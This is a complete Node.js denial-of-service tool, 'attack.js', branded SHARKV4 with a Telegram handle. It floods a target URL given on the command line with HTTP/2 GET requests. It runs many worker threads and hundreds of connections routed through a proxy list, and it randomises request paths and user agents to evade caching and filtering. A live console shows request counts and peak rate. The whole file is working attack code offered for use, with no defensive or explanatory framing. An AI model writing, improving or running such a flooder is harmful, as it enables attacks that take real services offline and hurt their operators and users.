const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const fs = require('fs');
const net = require('net');
const readline = require('readline');

let THREADS = getRandomInt(15, 35);
const POWER_MULTIPLIER = 1;
const MAX_INFLIGHT = 2000;
const REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let rpsLastSecond = 0;
let maxRps = 0;
let endTime = 0;

const signatures = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomSignature() {
    return signatures[Math.floor(Math.random() * signatures.length)];
}

function generateUserAgent() {
    const tag = randomSignature();
    return `Mozilla/5.0 (${Math.random().toFixed(4)}; V4) ${tag}`;
}

function generateRandomPath() {
    const tag = randomSignature().replace(/\s/g, '-');
    const rand = Math.random().toString(36).substring(2, 12);
    return `/${tag}/${rand}`;
}

function loadProxies() {
    try {
        return fs.readFileSync('proxies.txt', 'utf-8').split('\n').filter(Boolean);
    } catch {
        return [];
    }
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    endTime = Date.now() + duration * 1000;
    const proxies = loadProxies();

    console.clear();
    console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
    console.log(`Initializing with ${THREADS} threads...`);

    function startThreads() {
        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            new Worker(__filename, { workerData: { target, duration, proxies } });
        }
    }

    startThreads();

    setInterval(() => {
        THREADS = getRandomInt(15, 35);
    }, 20000);

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, REFRESH_RATE);

    function renderStats() {
        const remaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
        console.log(`==============================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`==============================`);
        console.log(`succes: ${successCount}`);
        console.log(`vape: ${errorCount}`);
        console.log(`==============================`);
        console.log(`REMAINING: ${remaining} SEC`);
    }

    const server = net.createServer(socket => {
        socket.on('data', chunk => {
            const msg = chunk.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, proxies } = workerData;
    const end = Date.now() + duration * 1000;
    const statSocket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => statSocket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > end || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const headers = {
                    ':method': 'GET',
                    ':path': generateRandomPath(),
                    'user-agent': generateUserAgent()
                };

                const req = client.request(headers);

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), 0);
    }

    function createConnection(useProxy) {
        if (Date.now() > end) return;

        let proxy = useProxy && proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;

        try {
            let client;
            if (proxy) {
                const [host, port] = proxy.split(':');
                const socket = require('net').connect(port, host, () => {
                    const conn = http2.connect(target, { createConnection: () => socket });
                    handleConnection(conn);
                });

                socket.on('error', () => {
                    socket.destroy();
                    setTimeout(() => createConnection(false), 100); // fallback to raw
                });

            } else {
                client = http2.connect(target);
                handleConnection(client);
            }

            function handleConnection(client) {
                const inflight = { count: 0 };

                client.on('error', () => {
                    client.destroy();
                    setTimeout(() => createConnection(useProxy), 500);
                });

                client.on('goaway', () => client.close());
                client.on('close', () => setTimeout(() => createConnection(useProxy), 500));

                client.on('connect', () => {
                    for (let i = 0; i < 10; i++) sendLoop(client, inflight);
                });
            }
        } catch {
            setTimeout(() => createConnection(false), 1000);
        }
    }

    const launchCount = getRandomInt(500, 1000);
    for (let i = 0; i < launchCount; i++) {
        createConnection(true);
    }
}
